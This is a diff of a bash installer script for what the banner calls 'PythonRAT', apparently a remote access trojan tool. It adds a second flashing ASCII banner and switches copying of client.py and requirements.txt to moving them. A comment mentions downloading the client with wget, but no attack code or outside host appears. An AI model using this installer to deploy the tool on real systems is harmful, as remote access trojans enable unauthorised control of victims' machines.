@@ -1,13 +1,27 @@
 #!/bin/bash
 
-# Fonction pour afficher la bannière avec effet de clignotement
-display_flashing_banner() {
-    colors=("31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36")
+
+
+display_flashing_bannerb() {
+    colors=("34" "35" "36" "31" "32" "33" "34" "35" "36" "31" "32" "33" "34" "35" "36" "31" "32" "33")
     for color in "${colors[@]}"; do
         echo -e "\e[1;${color}m"
         cat << "EOF"
                  TRHACKNON
-        _        PythonRAT        _
+                 PythonRAT
+EOF
+        sleep 0.2
+        clear
+    done
+}
+
+# Fonction pour afficher la bannière avec effet de clignotement
+display_flashing_banner() {
+    colors=("31" "33" "32" "34" "36" "35" "31" "33" "31" "34" "36" "35" "31" "33" "32" "34" "36" "35")
+    for color in "${colors[@]}"; do
+        echo -e "\e[1;${color}m"
+        cat << "EOF"
+        _                         _
        |_|                       |_|
        | |         /^^^\         | |
       _| |_      (| "o" |)      _| |_
@@ -40,6 +54,7 @@ confirm() {
 }
 
 # Afficher la bannière avec effet de clignotement
+display_flashing_bannerb &
 display_flashing_banner
 
 # Télécharger le client.py avec wget
@@ -74,6 +89,6 @@ fi
 
 # Déplacer les fichiers dans le répertoire "src" s'il a été créé
 if [ -d "src" ]; then
-    cp client.py src/
-    cp requirements.txt src/
+    mv client.py src/
+    mv requirements.txt src/
 fi
